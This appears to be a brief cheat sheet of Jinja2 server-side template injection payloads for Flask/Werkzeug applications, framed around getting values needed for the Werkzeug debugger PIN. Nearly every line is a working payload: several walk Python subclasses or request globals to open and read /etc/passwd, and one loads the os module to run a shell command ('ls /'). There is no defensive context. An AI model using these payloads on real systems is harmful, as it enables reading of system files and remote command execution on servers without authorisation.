PIN use getpass.getuser(), leak from Werkzeug:
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}
{% endif %}
{% endfor %}
```

ssti:
```
{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}  

{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
```

Alternative __enter__ or __exit__:
```
{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}   

{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

```

get ls
```
{{[].__class__.__base__.__subclasses__()[84]["load_module"]("os")["popen"]("ls /").read()}}
```


